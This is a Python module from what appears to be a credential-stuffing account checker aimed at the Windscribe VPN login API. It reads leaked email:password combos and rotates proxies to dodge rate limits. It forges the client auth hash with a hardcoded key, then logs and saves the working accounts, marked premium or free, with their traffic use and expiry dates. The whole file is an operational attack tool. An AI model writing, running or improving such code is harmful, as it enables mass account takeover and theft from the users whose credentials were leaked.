from modules.variables import Checker
from requests import Session
from modules.functions import bad_proxy, log, return_proxy,save,set_proxy
from time import time
from hashlib import md5
from requests.adapters import HTTPAdapter, Retry
import functools

def check(email:str,password:str):
    username = email.split("@")[0] if "@" in email else email
    email = email if "@" in email else "-"
    
    while not Checker.stopping:
        try:
            proxy = set_proxy()
            proxy_set = set_proxy(proxy)

            with Session() as s:
                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))
                
                unix = time()
                auth_hash = md5(f"952b4412f002315aa50751032fcaab03{unix}".encode()).hexdigest()
                headers = {
                    "Host": "api.windscribe.com" ,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0" ,
                    "Accept": "*/*" ,
                    "Accept-Language": "en-US,en;q=0.5" ,
                    "Content-Type": "application/x-www-form-urlencoded" ,
                    "Origin": "null" ,
                    "Connection": "keep-alive" ,
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded" 
                }
                data = {'username':username,'password':password,'time':unix,'client_auth_hash':auth_hash,'session_type_id':2}
                response = s.post("https://api.windscribe.com/Session?platform=firefox",headers=headers,data=data) 
                if response.status_code == 403 or "Could not log in with provided credentials" in response.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                elif "session_auth_hash" not in response.text:
                    raise

                if "is_premium\": 0" in response.text:
                    if not Checker.cui: log("custom",':'.join([username,password]),"Windscribe")
                    save("Windscribe","custom",Checker.time,':'.join([username,password])+f" | Original Combo: {email}:{password}")
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
                elif "is_premium\": 1" in response.text:
                    djson = response.json()["data"]
                    email = djson["email"]
                    username = djson["username"]
                    used = f'{(((djson["traffic_used"]/1024)/1024)/1024)}GB/{(((djson["traffic_max"]/1024)/1024)/1024)}GB'
                    expire = djson["premium_expiry_date"]
                    if not Checker.cui: log("good",':'.join([username,password]),"Windscribe")
                    save("Windscribe","good",Checker.time,':'.join([username,password])+f" | Email: {email} | Username: {username} | Used: {used} | Expire: {expire}")
                    Checker.good += 1
                    return_proxy(proxy)
                    return
        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1

        